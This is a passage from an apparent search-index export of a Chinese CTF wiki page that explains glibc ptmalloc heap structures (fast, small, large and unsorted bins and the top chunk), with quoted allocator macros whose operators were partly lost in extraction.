mchunkptr   bins [   NBINS   *   2   -   2   ];   \u867d\u7136\u6bcf\u4e2a bin \u7684\u8868\u5934\u4f7f\u7528 mchunkptr \u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u8fd9\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u5c06\u6bcf\u4e2a bin \u8f6c\u5316\u4e3a malloc_chunk \u6307\u9488\u3002\u6211\u4eec\u5728\u4f7f\u7528\u65f6\uff0c\u4f1a\u5c06\u8fd9\u4e2a\u6307\u9488\u5f53\u505a\u4e00\u4e2a chunk \u7684 fd \u6216 bk \u6307\u9488\u6765\u64cd\u4f5c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u5904\u4e8e\u7a7a\u95f2\u7684\u5806\u5757\u94fe\u63a5\u5728\u4e00\u8d77\u3002\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u90a3\u5230\u5e95\u662f\u600e\u4e48\u8282\u7701\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee532\u4f4d\u7cfb\u7edf\u4e3a\u4f8b     \u542b\u4e49  bin1\u7684fd/bin2\u7684prev_size  bin1\u7684bk/bin2\u7684size  bin2\u7684fd/bin3\u7684prev_size  bin2\u7684bk/bin3\u7684size      bin\u4e0b\u6807  0  1  2  3     \u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2abin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2abin\u4f1a\u5171\u4eab\u524d\u9762\u7684bin\u7684\u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3amalloc chunk\u90e8\u5206\u7684prev_size\u548csize\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c bin\u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2abin\u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin\u8868\u5934\u7684 chunk \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u88ab\u5176\u5b83bin\u6240\u5229\u7528\u7684\u3002  \u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b   \u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002  \u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a 2\u4e2a\u673a\u5668\u5b57\u957f \uff0c\u537332\u4f4d\u76f8\u5dee8\u5b57\u8282\uff0c64\u4f4d\u76f8\u5dee16\u5b57\u8282\u3002  small bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684chunk\u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002   \u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9bbin\u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a \u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2chunk\u4e0d\u80fd\u5728\u4e00\u8d77 \u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk  \u5148 \u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002 \u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk \u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002  bin \u901a\u7528\u7684\u5b8f\u5982\u4e0b  typedef   struct   malloc_chunk   * mbinptr ;  /* addressing -- note that bin_at(0) does not exist */  #define bin_at(m, i)                                                           \\      (mbinptr)(((char *)  ((m)- bins[ ((i) -1) * 2 ])) -                        \\                offsetof(struct malloc_chunk, fd))  /* analog of ++bin */  //\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740  #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr)   1)))  /* Reminders about list directionality within bins */  // \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin  // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk  #define first(b) ((b)- fd)  // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk  #define last(b) ((b)- bk)", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#fast-bin", 
            "text": "\u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002 \u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002 \u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY   /*     Fastbins      An array of lists holding recently freed small chunks.  Fastbins      are not doubly linked.  It is faster to single-link them, and      since chunks are never removed from the middles of these lists,      double linking is not necessary. Also, unlike regular bins, they      are not even processed in FIFO order (they use faster LIFO) since      ordering doesn t much matter in the transient contexts in which      fastbins are normally used.      Chunks in fastbins keep their inuse bit set, so they cannot      be consolidated with other free chunks. malloc_consolidate      releases all chunks in fastbins and consolidates them with      other free chunks.   */  typedef   struct   malloc_chunk   * mfastbinptr ;  /*      This is in malloc_state.      /* Fastbins */ \n     mfastbinptr   fastbinsY [   NFASTBINS   ];  */   \u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528\u5355\u5411\u94fe\u8868\u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7\uff0c\u5e76\u4e14 \u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565 \uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc\u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002  \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08 32\u4f4d\u7cfb\u7edf\u4e3a\u4f8b \uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684chunk\u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a80\u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a\uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a8\u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u523080\u5b57\u8282\uff0c\u5b9a\u4e49\u5982\u4e0b  #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)  #ifndef DEFAULT_MXFAST  #define DEFAULT_MXFAST (64 * SIZE_SZ / 4)  #endif  /* The maximum fastbin request size we support */  #define MAX_FAST_SIZE (80 * SIZE_SZ / 4)  /*     Since the lowest 2 bits in max_fast don t matter in size comparisons,     they are used as flags.   */  /*     FASTCHUNKS_BIT held in max_fast indicates that there are probably     some fastbin chunks. It is set true on entering a chunk into any     fastbin, and cleared only in malloc_consolidate.     The truth value is inverted so that have_fastchunks will be true     upon startup (since statics are zero-filled), simplifying     initialization checks.   */  //\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709  #define FASTCHUNKS_BIT (1U)  #define have_fastchunks(M) (((M)- flags   FASTCHUNKS_BIT) == 0)  #define clear_fastchunks(M) catomic_or( (M)- flags, FASTCHUNKS_BIT)  #define set_fastchunks(M) catomic_and( (M)- flags, ~FASTCHUNKS_BIT)  /*     NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous     regions.  Otherwise, contiguity is exploited in merging together,     when possible, results from consecutive MORECORE calls.     The initial value comes from MORECORE_CONTIGUOUS, but is     changed dynamically if mmap is ever used as an sbrk substitute.   */  // MORECODE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002  // \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4  // \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a  // \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002  #define NONCONTIGUOUS_BIT (2U)  #define contiguous(M) (((M)- flags   NONCONTIGUOUS_BIT) == 0)  #define noncontiguous(M) (((M)- flags   NONCONTIGUOUS_BIT) != 0)  #define set_noncontiguous(M) ((M)- flags |= NONCONTIGUOUS_BIT)  #define set_contiguous(M) ((M)- flags  = ~NONCONTIGUOUS_BIT)  /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the     arena.  Such an arena is no longer used to allocate chunks.  Chunks     allocated in that arena before detecting corruption are not freed.  */  #define ARENA_CORRUPTION_BIT (4U)  #define arena_is_corrupt(A) (((A)- flags   ARENA_CORRUPTION_BIT))  #define set_arena_corrupt(A) ((A)- flags |= ARENA_CORRUPTION_BIT)  /*     Set value of max_fast.     Use impossibly small value if 0.     Precondition: there are no existing fastbin chunks.     Setting the value clears fastchunk bit but preserves noncontiguous bit.   */  #define set_max_fast(s)                                                        \\      global_max_fast =                                                          \\          (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ)   ~MALLOC_ALIGN_MASK))  #define get_max_fast() global_max_fast   ptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002  fastbin\u7684\u7d22\u5f15  #define fastbin(ar_ptr, idx) ((ar_ptr)- fastbinsY[ idx ])  /* offset 2 to use otherwise unindexable first 2 bins */  // chunk size=2*size_sz*(2+idx)  // \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002  #define fastbin_index(sz)                                                      \\      ((((unsigned int) (sz))   (SIZE_SZ == 8 ? 4 : 3)) - 2)   \u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684chunk\u5408\u5e76\u3002  \u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD\u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684chunk\u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002  /*     FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()     that triggers automatic consolidation of possibly-surrounding     fastbin chunks. This is a heuristic, so the exact value should not     matter too much. It is defined at half the default trim threshold as a     compromise heuristic to only attempt consolidation if it is likely     to lead to trimming. However, it is not dynamically tunable, since     consolidation reduces fragmentation surrounding large chunks even     if trimming is not used.   */  #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)   malloc_consolidate\u51fd\u6570\u53ef\u4ee5\u5c06fastbin\u4e2d\u6240\u6709\u7684chunk\u91ca\u653e\u5e76\u5408\u5e76\u5728\u4e00\u8d77\u3002\uff1f\uff1f\uff1f    /*\n    Chunks in fastbins keep their inuse bit set, so they cannot\n    be consolidated with other free chunks. malloc_consolidate\n    releases all chunks in fastbins and consolidates them with\n    other free chunks.\n */", 
            "title": "fast bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#small-bin", 
            "text": "small bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size =2 * SIZE_SZ *index\uff0c\u5177\u4f53\u5982\u4e0b     \u4e0b\u6807  SIZE_SZ=4\uff0832\u4f4d\uff09  SIZE_SZ=8\uff0864\u4f4d\uff09      2  16  32    3  24  48    4  32  64    5  40  80    x  2*4*x  2*8*x    63  504  1008     small bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4\u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c small bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219 \uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002  small bin\u76f8\u5173\u7684\u5b8f\u5982\u4e0b  #define NSMALLBINS 64  #define SMALLBIN_WIDTH MALLOC_ALIGNMENT  // \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63  #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT   2 * SIZE_SZ)  #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)  //\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185  #define in_smallbin_range(sz)                                                  \\      ((unsigned long) (sz)   (unsigned long) MIN_LARGE_SIZE)  // \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002  #define smallbin_index(sz)                                                     \\      ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz))   4)                          \\                             : (((unsigned) (sz))   3)) +                       \\       SMALLBIN_CORRECTION)   \u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f  \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk \u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230small bin\u4e2d\u53bb\u7684\u3002", 
            "title": "small bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#large-bin", 
            "text": "large bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c\u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185\u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a     \u7ec4  \u6570\u91cf  \u516c\u5dee      1  32  64B    2  16  512B    3  8  4096B    4  4  32768B    5  2  262144B    6  1  \u4e0d\u9650\u5236     \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002  \u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512 6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a56+8=64\u3002  #define largebin_index_32(sz)                                                  \\      (((((unsigned long) (sz))   6)  = 38)                                     \\           ? 56 + (((unsigned long) (sz))   6)                                  \\           : ((((unsigned long) (sz))   9)  = 20)                               \\                 ? 91 + (((unsigned long) (sz))   9)                            \\                 : ((((unsigned long) (sz))   12)  = 10)                        \\                       ? 110 + (((unsigned long) (sz))   12)                    \\                       : ((((unsigned long) (sz))   15)  = 4)                   \\                             ? 119 + (((unsigned long) (sz))   15)              \\                             : ((((unsigned long) (sz))   18)  = 2)             \\                                   ? 124 + (((unsigned long) (sz))   18)        \\                                   : 126)  #define largebin_index_32_big(sz)                                              \\      (((((unsigned long) (sz))   6)  = 45)                                     \\           ? 49 + (((unsigned long) (sz))   6)                                  \\           : ((((unsigned long) (sz))   9)  = 20)                               \\                 ? 91 + (((unsigned long) (sz))   9)                            \\                 : ((((unsigned long) (sz))   12)  = 10)                        \\                       ? 110 + (((unsigned long) (sz))   12)                    \\                       : ((((unsigned long) (sz))   15)  = 4)                   \\                             ? 119 + (((unsigned long) (sz))   15)              \\                             : ((((unsigned long) (sz))   18)  = 2)             \\                                   ? 124 + (((unsigned long) (sz))   18)        \\                                   : 126)  // XXX It remains to be seen whether it is good to keep the widths of  // XXX the buckets the same or whether it should be scaled by a factor  // XXX of two as well.  #define largebin_index_64(sz)                                                  \\      (((((unsigned long) (sz))   6)  = 48)                                     \\           ? 48 + (((unsigned long) (sz))   6)                                  \\           : ((((unsigned long) (sz))   9)  = 20)                               \\                 ? 91 + (((unsigned long) (sz))   9)                            \\                 : ((((unsigned long) (sz))   12)  = 10)                        \\                       ? 110 + (((unsigned long) (sz))   12)                    \\                       : ((((unsigned long) (sz))   15)  = 4)                   \\                             ? 119 + (((unsigned long) (sz))   15)              \\                             : ((((unsigned long) (sz))   18)  = 2)             \\                                   ? 124 + (((unsigned long) (sz))   18)        \\                                   : 126)  #define largebin_index(sz)                                                     \\      (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \\                                                  ? largebin_index_32_big(sz)    \\                                                  : largebin_index_32(sz))", 
            "title": "large bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#unsorted-bin", 
            "text": "unsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002  \u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b  /*     Unsorted chunks      All remainders from chunk splits, as well as all returned chunks,      are first placed in the  unsorted  bin. They are then placed      in regular bins after malloc gives them ONE chance to be used before      binning. So, basically, the unsorted_chunks list acts as a queue,      with chunks being placed on it in free (and malloc_consolidate),      and taken off (to be either used or placed in bins) in malloc.      The NON_MAIN_ARENA flag is never set for unsorted chunks, so it      does not have to be taken into account in size comparisons.   */   \u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */  #define unsorted_chunks(M) (bin_at(M, 1))   unsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684bin\u6570\u7ec4\u4e0b\u68071\u5904\u3002\u6545\u800c unsorted bin\u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90   \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8eMINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002  \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002   \u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002", 
            "title": "unsorted bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#common-macro", 
            "text": "\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f\u3002  \u6839\u636echunk\u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97chunk\u6240\u5728\u7684\u7d22\u5f15  #define bin_index(sz)                                                          \\      ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))", 
            "title": "common macro"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#top-chunk", 
            "text": "glibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b  /*     Top      The top-most available chunk (i.e., the one bordering the end of      available memory) is treated specially. It is never included in      any bin, is used only if no other chunk is available, and is      released back to the system if it is very large (see      M_TRIM_THRESHOLD).  Because top initially      points to its own bin with initial zero size, thus forcing      extension on the first malloc request, we avoid having any special      code in malloc to check whether it even exists yet. But we still      need to do so when getting memory from system, so we make      initial_top treat the bin as a legal but unusable chunk during the      interval between initialization and the first call to      sysmalloc. (This is somewhat delicate, since it relies on      the 2 preceding words to be zero during this interval as well.)   */  /* Conveniently, the unsorted bin can be used as dummy top on first call */  #define initial_top(M) (unsorted_chunks(M))   \u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002\u8fd9\u4e2a chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin\uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c\u5176\u5927\u5c0f\u4e0d\u5c0f\u4e8e\u6307\u5b9a\u7684\u5927\u5c0f\uff0c\u5c31\u8fdb\u884c\u5206\u914d\uff0c\u5e76\u5c06\u5269\u4e0b\u7684\u90e8\u5206\u4f5c\u4e3a\u65b0\u7684 top 